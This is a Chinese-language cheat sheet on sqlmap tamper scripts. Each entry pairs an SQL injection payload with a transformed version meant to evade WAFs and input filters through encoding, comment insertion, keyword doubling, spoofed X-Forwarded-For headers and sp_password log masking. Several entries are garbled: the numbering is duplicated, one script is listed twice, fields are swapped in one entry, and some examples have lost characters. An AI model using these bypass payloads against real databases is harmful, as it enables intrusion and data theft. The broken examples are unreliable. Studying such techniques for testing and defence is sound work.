## temper 介绍
1. apostrophemask.py

         功能：对引号进行utf-8格式编码(%EF%BC%87)
         平台：All
         举例：1 AND '1'='1 ==> 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871

2. apostrophenullencode.py

        功能：用非法的双unicode字符(%00%27)替换引号字符
        平台：All
        举例：1 AND '1'='1 ==> 1 AND %00%271%00%27=%00%271
3. appendnullbyte.py

         功能：在有效载荷结束位置加载零字节字符编码
         平台：Microsoft Access
         举例：1 AND 1=1 ==> 1 AND 1=1%00

4. base64encode.py

         功能：用base64格式进行编码
         平台：All
         举例：1' AND SLEEP(5)# ==> MScgQU5EIFNMRUVQKDUpIw==

5. between.py

         功能：用between替换大于号（>）
         平台：Mssql2005、MySQL 4/5.0/5.5、Oracle 10g、PostgreSQL 8.3/8.4/9.0
         举例：1 AND A > B --  ==> 1 AND A NOT BETWEEN 0 AND B  --
         1 AND A = B --  ==> 1 AND A BETWEEN B AND B --

6. bluecoat.py

         功能：对SQL语句替换空格字符为(%09)，并替换"="--->"LIKE"
         平台：MySQL 5.1, SGOS
         举例：SELECT username FROM users WHERE id = 1 ==> SELECT%09username FROM%09users WHERE%09id LIKE 1

7. apostrophemask.py

         功能：用utf-8格式编码引号(如：%EF%BC%87)
         平台：All
         举例：1 AND '1'='1 ==> 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871

8. charunicodeencode.py

         功能：对字符串进行Unicode格式转义编码
         平台：Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET
         举例：SELECT FIELD%20FROM TABLE ==> %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045

9. charencode.py

         功能：采用url格式编码1次
         平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
         举例：SELECT FIELD FROM%20TABLE ==> %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45

10. chardoubleencode.py

         功能：采用url格式编码2次
         平台：All
         举例：SELECT FIELD FROM%20TABLE ==> %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545

11. commalessmid.py

         功能：将payload中的逗号用 from和for代替，用于过滤了逗号并且是3个参数的情况
         平台：MySQL 5.0, 5.5
         举例：MID(VERSION(), 1, 1) ==> MID(VERSION() FROM 1 FOR 1)

11. concat2concatws.py

         功能：CONCAT() ==> CONCAT_WS()，用于过滤了CONCAT()函数的情况
         平台： MySQL 5.0
         举例：CONCAT(1,2) ==> CONCAT_WS(MID(CHAR(0),0,0),1,2)

12. equaltolike.py

         功能：= ==> LIKE，用于过滤了等号"="的情况
         平台：Mssql 2005、MySQL 4, 5.0 and 5.5
         举例：SELECT * FROM users WHERE id=1 ==> SELECT * FROM users WHERE id LIKE 1

13. greatest.py
         功能：> ==> GREATEST
         平台：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
         举例：1 AND A > B ==> 1 AND GREATEST(A, B+1)=A
         a和b+1比较，取两者中的最大值为a；则a >= b+1，亦即a > b

14. halfversionedmorekeywords.py

         功能：空格 ==> /*!0 （在关键字前添加注释）
         平台：MySQL 4.0.18, 5.0.22（Mysql < 5.1）
         举例：union ==> /*!0union

15. ifnull2ifisnull.py

         功能：IFNULL(A, B) ==> IF(ISNULL(A), B, A)
         平台：MySQL 5.0 and 5.5
         举例：IFNULL(1, 2) ==> IF(ISNULL(1),2,1)

16. informationschemacomment.py

         功能：在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况
         retVal = re.sub(r"(?i)(information_schema).", "g<1>/**/.", payload)
         平台：All
         举例：select table_name from information_schema.tables ==> select table_name from information_schema/**/.tables

17. lowercase.py

         功能：将 payload 里的大写转为小写
         平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
         举例：SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> select table_name from information_schema.tables

18. modsecurityversioned.py

         功能：用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf
         平台：MySQL 5.0
         举例：1 AND 2>1--  ==> 1 /*!30874AND 2>1*/--

19. modsecurityzeroversioned.py

         功能：用注释来包围完整的查询语句，用于绕过 waf ，和上面类似
         平台：Mysql
         举例：1 and 2>1--+ ==> 1 /!00000and 2>1/--+

20. multiplespaces.py

         功能：围绕SQL关键字添加多个空格
         平台：All
         举例：1 UNION SELECT foobar ==> 1   UNION   SELECT   foobar

21. nonrecursivereplacement.py

         功能：关键字双写，可用于关键字过滤
         平台：All
         举例：1 UNION SELECT 2--  ==> 1 UNIONUNION SELESELECTCT 2--

22. overlongutf8.py

         功能： 转换给定的payload当中的所有字符
         平台：All
         举例：SELECT FIELD FROM TABLE WHERE 2>1 ==> SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1

23. percentage.py

         功能：用百分号来绕过关键字过滤，在关键字的每个字母前面都加一个(%)
         平台：Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0
         举例：SELECT FIELD FROM TABLE ==> %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E

24. randomcase.py

         功能：将 payload 随机大小写
         平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
         举例：INSERT ==> InseRt

25. randomcomments.py

         功能：在 payload 的关键字中间随机插入注释符 /**/ ，可用于绕过关键字过滤
         平台：Mysql
         举例：INSERT ==> I / ** / N / ** / SERT

26. securesphere.py

         功能：在payload后追加特殊构造的字符串
         平台：All
         举例：1 AND 1=1 ==> 1 AND 1=1 and '0having'='0having'

27. space2comment.py

         功能：用注释符 // 代替空格，用于空格的绕过
         平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
         举例：SELECT id FROM users ==> SELECT//id//FROM//users

28. space2dash.py

         功能：用[注释符(--)+一个随机字符串+一个换行符]替换控制符
         平台：MSSQL、 SQLite
         举例：union select 1,2--+ ==> union--HSHjsJh%0Aselect--HhjHSJ%0A1,2--+

29. space2hash.py

         功能：用[注释符(#)+一个随机字符串+一个换行符]替换控制符
         平台：Mysql
         举例：union select 1,2--+ ==> union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2--+

30. space2morehash.py

         功能：用多个[注释符(#)+一个随机字符串+一个换行符]替换控制符
         平台：MySQL >= 5.1.13
         举例：union select 1,2--+ ==> union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2--+

31. space2mssqlblank.py

         功能：用随机的空白符替换payload中的空格
         blanks = ('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')
         平台：Mssql 2000,2005
         举例：SELECT id FROM users ==> SELECT%0Eid%0DFROM%07users

32. space2mssqlhash.py

         功能：用[字符# +一个换行符]替换payload中的空格
         平台：MSSQL、MySQL
         举例：union select 1,2--+ ==> union%23%0Aselect%23%0A1,2--+

33. space2plus.py

         功能：用加号(+)替换空格
         平台：All
         举例：SELECT id FROM users ==> SELECT+id+FROM+users

34. space2randomblank.py

         功能：用随机的空白符替换payload中的空格
         平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
         举例：SELECT id FROM users ==> SELECT%0Did%0DFROM%0Ausers

35. sp_password.py

         功能：在payload语句后添加 sp_password ，用于迷惑数据库日志（Space ==> sp_password）
         平台：Mssql
         举例：1 AND 9227=9227--  ==> 1 AND 9227=9227 -- sp_password

36. symboliclogical.py

         功能：用 && 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况
         平台：All
         举例：1 and 1=1 ==> 1 %26%26 1=1
         1 or 1=1 ==> 1 %7c%7c 1=1

37. unionalltounion.py

         功能：用 union select 替换union all select
         平台：All
         举例：union all select 1,2--+ ==> union select 1,2--+

38. unmagicquotes.py

         功能：用宽字符绕过 GPC addslashes
         平台：All
         举例：1' and 1=1 ==> 1%df%27 and 1=1--

39. uppercase.py

         功能：将payload中的小写字母转为大写格式
         平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
         举例：insert ==> INSERT

40. varnish.py

         功能：添加一个HTTP头“ X-originating-IP ”来绕过WAF
         平台：headers = kwargs.get("headers", {})headers["X-originating-IP"] = "127.0.0.1"return payload
         举例：All

41. versionedkeywords.py

         功能：对非函数的关键字进行注释
         平台：MySQL 4.0.18, 5.1.56, 5.5.11
         举例：1 union select user() ==> 1/!UNION//!SELECT/user()

42. versionedmorekeywords.py

         功能：对每个关键字进行注释处理
         平台：MySQL 5.1.56, 5.5.11
         举例：1 union select user() ==> 1/!UNION//!SELECT/user()

43. xforwardedfor.py

         功能：添加一个伪造的HTTP头“ X-Forwarded-For ”来绕过WAF
         平台：All
         举例：headers = kwargs.get("headers", {})headers["X-Forwarded-For"] = randomIP()return payload
